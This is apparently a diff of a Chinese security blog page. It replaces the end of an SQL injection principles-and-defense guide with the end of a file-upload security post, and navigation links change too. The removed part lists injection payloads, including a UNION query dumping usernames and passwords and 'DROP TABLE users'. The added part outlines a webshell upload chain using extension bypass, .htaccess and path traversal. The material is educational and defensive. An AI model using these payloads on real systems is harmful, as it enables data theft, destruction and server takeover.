-<pre><code>?id=1 UNION SELECT 1,username,password,4 FROM users--
-</code></pre>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>适用条件：页面无直接数据回显，但能区分查询结果为真或为假时的不同页面状态（如正常显示 vs “记录不存在”）。</p>
-<p>原理：逐位猜测目标数据。每次注入一个布尔条件，根据页面响应判断条件是否成立。</p>
-<pre><code>?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=&#39;a&#39;
-</code></pre>
-<p>如果页面正常，说明密码第一位是 <code>a</code>；如果页面异常，继续尝试 <code>b</code>、<code>c</code>… 对每一位重复此过程。</p>
-<p>效率优化：使用二分法将每位字符的猜测次数从最多 128 次降到 7 次。</p>
-<pre><code>?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))&gt;64
-</code></pre>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>适用条件：页面既无数据回显，也无法通过布尔条件区分真假（所有响应页面完全相同）。</p>
-<p>原理：利用条件语句控制数据库的延迟响应。通过 <code>SLEEP()</code> 或类似函数，根据响应时间推断数据。</p>
-<pre><code>?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))&gt;100, SLEEP(3), 0)
-</code></pre>
-<p>如果页面响应延迟 3 秒，说明条件成立（数据库名首字符 ASCII 大于 100）。</p>
-<p>时间盲注是效率最低的注入方式，通常需要借助自动化工具（如 sqlmap）批量执行。</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>适用条件：页面不显示查询结果，但会显示数据库的错误信息。</p>
-<p>原理：构造使数据库引擎报错的表达式，错误信息中携带目标数据。</p>
-<p>MySQL 常用方法：</p>
-<pre><code>?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
-</code></pre>
-<p><code>EXTRACTVALUE</code> 的第二个参数期望是合法的 XML 路径，传入非 XML 格式的数据会触发错误，错误信息中包含拼接的 <code>database()</code> 结果。</p>
-<p>其他函数：<code>UPDATEXML()</code>、<code>FLOOR()</code> + <code>GROUP BY</code> + <code>COUNT()</code> 利用主键重复报错。</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>适用条件：数据库引擎和 API 支持执行多条 SQL 语句（用分号分隔）。</p>
-<p>原理：在原始查询后追加新的 SQL 语句，执行任意操作（增删改查、创建用户、写文件等）。</p>
-<pre><code>?id=1; DROP TABLE users--
-</code></pre>
-<p>MySQL 的 <code>mysqli_multi_query()</code> 支持堆叠，但 PDO + MySQL 默认不支持。SQL Server 和 PostgreSQL 默认支持。堆叠注入的危害远大于数据泄露，攻击者可以执行任何数据库操作。</p>
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>适用条件：用户输入被存储到数据库，后续被取出拼接成新的 SQL 语句。</p>
-<p>原理：第一次输入时，恶意数据被原样存储（转义处理使其安全入库）。第二次取出使用时，数据被再次拼接到 SQL 语句中，此时没有经过转义，触发注入。</p>
-<p>典型场景：用户注册时用户名为 <code>admin&#39;-- </code>（带尾随空格），系统存储了这个值。后续修改密码时，查询使用 <code>WHERE username=&#39;[从数据库取出的用户名]&#39;</code>，此时 <code>admin&#39;--</code> 导致条件变为 <code>WHERE username=&#39;admin&#39;</code>，修改的是 admin 账户的密码。</p>
-<p>二次注入比反射型注入更隐蔽，因为恶意数据在存储阶段不会触发任何异常。</p>
-<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="参数化查询（预编译语句）"><a href="#参数化查询（预编译语句）" class="headerlink" title="参数化查询（预编译语句）"></a>参数化查询（预编译语句）</h3><p>这是防御 SQL 注入最根本、最有效的方法。</p>
-<p>原理：参数化查询将 SQL 语句的结构定义与数据传递分离。应用程序先将 SQL 模板（带占位符）发送给数据库引擎，引擎解析并编译这条语句的结构。之后，应用程序再发送参数值，引擎将其作为纯数据处理，不会重新解析语句结构。</p>
-<pre><code class="java">// Java JDBC 示例
-String sql = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;
-PreparedStatement stmt = conn.prepareStatement(sql);
-stmt.setString(1, username);
-stmt.setString(2, password);
-ResultSet rs = stmt.executeQuery();
-</code></pre>
-<pre><code class="python"># Python DB-API 示例
-cursor.execute(
-    &quot;SELECT * FROM users WHERE username = %s AND password = %s&quot;,
-    (username, password)
-)
-</code></pre>
-<p>无论用户输入什么内容，<code>?</code> 或 <code>%s</code> 占位符位置的值始终被当作数据处理，不可能改变 SQL 语句的逻辑结构。这是从协议层面消除了注入的可能性。</p>
-<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>作为参数化查询的补充，不单独作为防御手段。</p>
-<p>白名单验证：对已知合法输入定义精确规则。如用户 ID 只允许纯数字，邮箱必须符合 RFC 格式。</p>
-<p>黑名单过滤：移除或转义特定字符（如单引号、分号）。不推荐作为主要防御，因为黑名单难以穷举所有变体（编码绕过、Unicode 混淆等）。</p>
-<p>转义处理：对特殊字符添加转义符（如 <code>&#39;</code> → <code>\&#39;</code>）。MySQL 的 <code>mysql_real_escape_string()</code> 就是这种方式。但转义容易遗漏，且与字符集配置相关，存在绕过风险。</p>
-<h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><p>限制数据库账户的权限范围。</p>
-<p>应用程序使用的数据库账户不应拥有 DBA 权限。只授予必要的 SELECT、INSERT、UPDATE、DELETE 权限，禁止 FILE、SUPER、GRANT 等高权限。这样即使发生注入，攻击者的操作范围也受到限制。</p>
-<p>为每个应用或模块使用独立的数据库账户，避免一个账户访问所有表。</p>
-<h3 id="WAF（Web-应用防火墙）"><a href="#WAF（Web-应用防火墙）" class="headerlink" title="WAF（Web 应用防火墙）"></a>WAF（Web 应用防火墙）</h3><p>在网络层对 HTTP 请求进行规则匹配，拦截包含注入特征的请求。</p>
-<p>WAF 可以作为纵深防御的一层，但不应作为唯一防线。绕过 WAF 的技术很多：编码变换（URL 编码、Unicode、Hex）、分块传输（Chunked Transfer）、注释混淆、大小写混合等。</p>
-<h3 id="ORM-框架"><a href="#ORM-框架" class="headerlink" title="ORM 框架"></a>ORM 框架</h3><p>使用 ORM（如 SQLAlchemy、Hibernate、ActiveRecord）操作数据库，ORM 内部默认使用参数化查询，从框架层面避免拼接 SQL。</p>
-<p>注意：ORM 不是万能的。如果开发者在 ORM 中使用了原生 SQL 拼接（如 SQLAlchemy 的 <code>text()</code> 或 <code>execute(raw_sql)</code>），同样会产生注入风险。</p>
-<h2 id="防御优先级"><a href="#防御优先级" class="headerlink" title="防御优先级"></a>防御优先级</h2><p>按有效性排序：</p>
+<hr>
+<h3 id="六、攻击链示例：从上传到-GetShell"><a href="#六、攻击链示例：从上传到-GetShell" class="headerlink" title="六、攻击链示例：从上传到 GetShell"></a>六、攻击链示例：从上传到 GetShell</h3><p>一个典型的完整攻击链：</p>
 <ol>
-<li>参数化查询。从协议层面消除注入，是唯一的根本解决方案。</li>
-<li>ORM 框架。封装了参数化查询，降低开发者犯错概率。</li>
-<li>最小权限。限制注入成功后的影响范围。</li>
-<li>输入验证。减少攻击面，作为辅助手段。</li>
-<li>WAF。网络层过滤，作为最后一道防线。</li>
+<li>发现上传接口，测试发现仅校验前端 JS 扩展名 → 直接绕过</li>
+<li>上传 <code>.php</code> 文件被拦截 → 尝试 <code>.php5</code> 成功（黑名单不完整）</li>
+<li>或者：上传 <code>shell.jpg</code>（内容是 PHP），同时上传 <code>.htaccess</code>（<code>AddType application/x-httpd-php .jpg</code>）→ 访问 <code>shell.jpg</code> 被当 PHP 执行</li>
+<li>如果上传目录禁止执行 → 尝试路径穿越写到其他目录 → <code>filename=../../app/shell.php</code></li>
+<li>如果路径穿越也被防住 → 寻找文件包含漏洞（LFI）配合图片马 → 上传含 PHP 代码的图片 → 通过 <code>include()</code> 触发执行</li>
 </ol>
-<p>核心原则只有一条：确保用户输入永远不被当作 SQL 指令执行。参数化查询是唯一从结构上保证这一点的方法，其他手段都是补充或兜底。</p>
+<p>这条攻击链说明：纵深防御的每一层都很重要，任何一层缺失都可能被突破。</p>
 
                 
             </div>
@@ -589,7 +808,7 @@ cursor.execute(
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2026/08/03/2026-08-03-sql-injection-guide/">http://example.com/2026/08/03/2026-08-03-sql-injection-guide/</a>
+                    <a href="http://example.com/2026/08/06/2026-08-06-file-upload-security/">http://example.com/2026/08/06/2026-08-06-file-upload-security/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -627,8 +846,16 @@ cursor.execute(
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
+                                </a>
+                            
+                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
                                 </a>
                             
                         </div>
@@ -800,9 +1027,10 @@ cursor.execute(
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/08/06/2026-08-06-file-upload-security/">
                     <div class="card-image">
@@ -820,9 +1048,9 @@ cursor.execute(
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-08-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -831,6 +1059,7 @@ cursor.execute(
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -857,19 +1086,19 @@ cursor.execute(
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/08/03/2026-08-03-server-environment-config/">
+                <a href="/2026/08/03/2026-08-03-sql-injection-guide/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="服务器环境配置">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="SQL 注入原理与防御指南">
                         
-                        <span class="card-title">服务器环境配置</span>
+                        <span class="card-title">SQL 注入原理与防御指南</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内容已加密，请输入密码查看
+                            
                         
                     </div>
                     <div class="publish-info">
@@ -878,12 +1107,8 @@ cursor.execute(
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%8A%80%E6%9C%AF/" class="post-category">
-                                    技术
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
                             
                         </span>
                     </div>
@@ -891,12 +1116,8 @@ cursor.execute(
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
-                        <span class="chip bg-color">服务器</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%A7%81%E5%AF%86/">
-                        <span class="chip bg-color">私密</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
